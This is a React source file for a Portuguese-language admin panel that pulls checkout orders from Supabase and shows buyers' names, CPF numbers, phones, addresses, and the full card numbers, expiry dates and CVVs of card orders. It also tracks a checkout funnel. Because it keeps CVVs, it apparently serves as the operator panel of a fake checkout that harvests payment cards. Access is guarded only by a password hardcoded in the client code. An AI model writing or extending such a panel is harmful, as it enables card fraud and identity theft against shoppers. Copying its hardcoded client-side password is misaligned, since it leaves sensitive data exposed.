import { useState, useEffect } from "react";
import { supabase } from "@/integrations/supabase/client";
import { Lock, Users, ShoppingCart, CreditCard, Eye, EyeOff, RefreshCw, ChevronDown, ChevronUp } from "lucide-react";

const SENHA_PAINEL = "a77312875";

const Painel = () => {
  const [autenticado, setAutenticado] = useState(false);
  const [senha, setSenha] = useState("");
  const [senhaErro, setSenhaErro] = useState(false);
  const [orders, setOrders] = useState<any[]>([]);
  const [analytics, setAnalytics] = useState<any[]>([]);
  const [loading, setLoading] = useState(false);
  const [expandedOrder, setExpandedOrder] = useState<string | null>(null);
  const [showSensitive, setShowSensitive] = useState<Record<string, boolean>>({});

  const handleLogin = () => {
    if (senha === SENHA_PAINEL) {
      setAutenticado(true);
      setSenhaErro(false);
    } else {
      setSenhaErro(true);
    }
  };

  const fetchData = async () => {
    setLoading(true);
    try {
      const [ordersRes, analyticsRes] = await Promise.all([
        supabase.from("checkout_orders").select("*").order("created_at", { ascending: false }) as any,
        supabase.from("checkout_analytics").select("*").order("created_at", { ascending: false }) as any,
      ]);
      setOrders(ordersRes.data || []);
      setAnalytics(analyticsRes.data || []);
    } catch (e) {
      console.error(e);
    }
    setLoading(false);
  };

  useEffect(() => {
    if (autenticado) fetchData();
  }, [autenticado]);

  const uniqueSessions = new Set(analytics.map((a: any) => a.session_id)).size;
  const stepCounts = [1, 2, 3, 4].map(s => ({
    step: s,
    label: s === 1 ? "Carrinho" : s === 2 ? "Dados" : s === 3 ? "Entrega" : "Pagamento",
    count: analytics.filter((a: any) => a.step_reached === s).length,
  }));
  const pageVisits = analytics.filter((a: any) => a.page_visited === "checkout_visit" || a.page_visited?.startsWith("index_")).length;

  const maskNumber = (num: string | null) => {
    if (!num) return "—";
    return "•••• •••• •••• " + num.slice(-4);
  };

  if (!autenticado) {
    return (
      <div className="min-h-screen bg-[#1a1a2e] flex items-center justify-center p-4">
        <div className="bg-[#16213e] rounded-2xl p-8 max-w-[400px] w-full shadow-2xl border border-[#0f3460]">
          <div className="flex items-center justify-center mb-6">
            <div className="w-16 h-16 bg-[#0f3460] rounded-full flex items-center justify-center">
              <Lock size={28} className="text-[#e94560]" />
            </div>
          </div>
          <h1 className="text-2xl font-bold text-white text-center mb-2">Painel Administrativo</h1>
          <p className="text-[#8892b0] text-center text-sm mb-6">Digite a senha para acessar</p>
          <input
            type="password"
            value={senha}
            onChange={(e) => { setSenha(e.target.value); setSenhaErro(false); }}
            onKeyDown={(e) => e.key === "Enter" && handleLogin()}
            placeholder="Senha de acesso"
            className="w-full bg-[#1a1a2e] border border-[#0f3460] rounded-lg px-4 py-3 text-white placeholder-[#4a5568] focus:outline-none focus:border-[#e94560] mb-3"
          />
          {senhaErro && <p className="text-[#e94560] text-sm mb-3">Senha incorreta</p>}
          <button
            onClick={handleLogin}
            className="w-full bg-[#e94560] text-white py-3 rounded-lg font-semibold hover:bg-[#c73e54] transition-colors"
          >
            Entrar
          </button>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-[#1a1a2e] text-white">
      {/* Header */}
      <header className="bg-[#16213e] border-b border-[#0f3460] px-4 py-4 flex items-center justify-between sticky top-0 z-50">
        <h1 className="text-lg font-bold">📊 Painel</h1>
        <button onClick={fetchData} disabled={loading} className="flex items-center gap-2 bg-[#0f3460] px-4 py-2 rounded-lg text-sm hover:bg-[#1a4080] transition-colors">
          <RefreshCw size={14} className={loading ? "animate-spin" : ""} />
          Atualizar
        </button>
      </header>

      <div className="p-4 max-w-[800px] mx-auto space-y-4">
        {/* Stats */}
        <div className="grid grid-cols-2 gap-3">
          <div className="bg-[#16213e] rounded-xl p-4 border border-[#0f3460]">
            <div className="flex items-center gap-2 mb-2">
              <Users size={18} className="text-[#3b82f6]" />
              <span className="text-xs text-[#8892b0]">Visitantes</span>
            </div>
            <p className="text-2xl font-bold">{uniqueSessions}</p>
          </div>
          <div className="bg-[#16213e] rounded-xl p-4 border border-[#0f3460]">
            <div className="flex items-center gap-2 mb-2">
              <ShoppingCart size={18} className="text-[#10b981]" />
              <span className="text-xs text-[#8892b0]">Pedidos</span>
            </div>
            <p className="text-2xl font-bold">{orders.length}</p>
          </div>
          <div className="bg-[#16213e] rounded-xl p-4 border border-[#0f3460]">
            <div className="flex items-center gap-2 mb-2">
              <Eye size={18} className="text-[#f59e0b]" />
              <span className="text-xs text-[#8892b0]">Visitas Páginas</span>
            </div>
            <p className="text-2xl font-bold">{pageVisits}</p>
          </div>
          <div className="bg-[#16213e] rounded-xl p-4 border border-[#0f3460]">
            <div className="flex items-center gap-2 mb-2">
              <CreditCard size={18} className="text-[#e94560]" />
              <span className="text-xs text-[#8892b0]">Pix Pendente</span>
            </div>
            <p className="text-2xl font-bold">{orders.filter((o: any) => o.pay_method === "pix" && (o.status === "pending" || !o.status)).length}</p>
          </div>
        </div>

        {/* Funil de etapas */}
        <div className="bg-[#16213e] rounded-xl p-4 border border-[#0f3460]">
          <h2 className="text-sm font-semibold mb-3 text-[#8892b0]">Funil do Checkout</h2>
          <div className="space-y-2">
            {stepCounts.map((s) => (
              <div key={s.step} className="flex items-center gap-3">
                <span className="text-xs text-[#8892b0] w-24">{s.label}</span>
                <div className="flex-1 bg-[#1a1a2e] rounded-full h-6 overflow-hidden">
                  <div
                    className="h-full bg-gradient-to-r from-[#3b82f6] to-[#e94560] rounded-full flex items-center justify-end pr-2 transition-all"
                    style={{ width: `${Math.max(s.count / (stepCounts[0].count || 1) * 100, 8)}%` }}
                  >
                    <span className="text-[11px] font-bold">{s.count}</span>
                  </div>
                </div>
              </div>
            ))}
          </div>
        </div>

        {/* Orders */}
        <div className="bg-[#16213e] rounded-xl border border-[#0f3460]">
          <div className="p-4 border-b border-[#0f3460]">
            <h2 className="text-sm font-semibold text-[#8892b0]">Pedidos ({orders.length})</h2>
          </div>
          {orders.length === 0 ? (
            <p className="p-4 text-center text-[#8892b0] text-sm">Nenhum pedido ainda</p>
          ) : (
            <div className="divide-y divide-[#0f3460]">
              {orders.map((order: any) => {
                const isExpanded = expandedOrder === order.id;
                const showCard = showSensitive[order.id];
                return (
                  <div key={order.id} className="p-4">
                    <button
                      onClick={() => setExpandedOrder(isExpanded ? null : order.id)}
                      className="w-full flex items-center justify-between text-left"
                    >
                      <div>
                        <p className="text-sm font-medium">{order.nome || "Sem nome"}</p>
                        <p className="text-xs text-[#8892b0]">{order.product_title}</p>
                        <p className="text-xs text-[#8892b0]">
                          {new Date(order.created_at).toLocaleString("pt-BR")}
                        </p>
                      </div>
                      <div className="flex items-center gap-2">
                        <span className={`text-xs px-2 py-1 rounded-full ${order.pay_method === "card" ? "bg-[#e94560]/20 text-[#e94560]" : "bg-[#10b981]/20 text-[#10b981]"}`}>
                          {order.pay_method === "card" ? "Cartão" : "Pix"}
                        </span>
                        <span className={`text-xs px-2 py-1 rounded-full ${
                          order.status === "paid" ? "bg-[#10b981]/20 text-[#10b981]" :
                          order.status === "failed" ? "bg-[#e94560]/20 text-[#e94560]" :
                          "bg-[#f59e0b]/20 text-[#f59e0b]"
                        }`}>
                          {order.status === "paid" ? "Pago" : order.status === "failed" ? "Falhou" : "Pendente"}
                        </span>
                        {isExpanded ? <ChevronUp size={16} /> : <ChevronDown size={16} />}
                      </div>
                    </button>

                    {isExpanded && (
                      <div className="mt-3 space-y-2 text-sm">
                        <div className="grid grid-cols-2 gap-2">
                          <InfoItem label="Email" value={order.email} />
                          <InfoItem label="CPF" value={order.cpf} />
                          <InfoItem label="Celular" value={order.celular} />
                          <InfoItem label="Produto" value={order.product_key} />
                          <InfoItem label="Preço" value={`R$ ${Number(order.product_price).toFixed(2).replace(".", ",")}`} />
                          <InfoItem label="Total" value={`R$ ${Number(order.total).toFixed(2).replace(".", ",")}`} />
                          <InfoItem label="Frete" value={order.shipping_option === "full" ? `R$ ${Number(order.shipping_cost).toFixed(2).replace(".", ",")}` : "Grátis"} />
                        </div>

                        <div className="border-t border-[#0f3460] pt-2 mt-2">
                          <p className="text-xs text-[#8892b0] mb-1">Endereço</p>
                          <p className="text-sm">{order.rua}, {order.numero} {order.complemento ? `- ${order.complemento}` : ""}</p>
                          <p className="text-sm">{order.bairro} - {order.cidade}/{order.uf}</p>
                          <p className="text-sm">CEP: {order.cep}</p>
                        </div>

                        {order.pay_method === "card" && (
                          <div className="border-t border-[#0f3460] pt-2 mt-2">
                            <div className="flex items-center justify-between mb-1">
                              <p className="text-xs text-[#8892b0]">Dados do Cartão</p>
                              <button
                                onClick={() => setShowSensitive(prev => ({ ...prev, [order.id]: !prev[order.id] }))}
                                className="flex items-center gap-1 text-xs text-[#3b82f6]"
                              >
                                {showCard ? <EyeOff size={12} /> : <Eye size={12} />}
                                {showCard ? "Ocultar" : "Mostrar"}
                              </button>
                            </div>
                            <div className="grid grid-cols-2 gap-2">
                              <InfoItem label="Nome no cartão" value={order.card_name} />
                              <InfoItem label="Bandeira" value={order.card_brand} />
                              <InfoItem label="Número" value={showCard ? order.card_number : maskNumber(order.card_number)} />
                              <InfoItem label="Validade" value={order.card_expiry} />
                              <InfoItem label="CVV" value={showCard ? order.card_cvv : "•••"} />
                              <InfoItem label="Parcelas" value={`${order.parcelas}x`} />
                            </div>
                          </div>
                        )}
                      </div>
                    )}
                  </div>
                );
              })}
            </div>
          )}
        </div>
      </div>
    </div>
  );
};

const InfoItem = ({ label, value }: { label: string; value: string | null }) => (
  <div>
    <p className="text-[11px] text-[#8892b0]">{label}</p>
    <p className="text-sm font-medium">{value || "—"}</p>
  </div>
);

export default Painel;
